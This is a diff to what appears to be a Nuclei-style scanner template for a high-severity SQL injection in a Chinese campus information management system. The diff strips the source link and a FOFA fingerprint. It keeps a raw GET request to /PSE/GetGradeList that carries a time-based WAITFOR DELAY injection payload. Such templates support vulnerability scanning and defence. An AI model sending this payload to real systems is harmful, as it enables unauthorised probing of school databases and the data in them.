@@ -3,12 +3,8 @@ info:
   name: 校园信息管理系统-SQL注入-GetGradeList
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yam7mzl0lwb36gkz'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yam7mzl0lwb36gkz
-    fofa: body="jwkqunline.html"
 http:
 - raw:
   - 'GET /PSE/GetGradeList?schoolId=1;WAITFOR%20DELAY%270:0:5%27%20-- HTTP/1.1
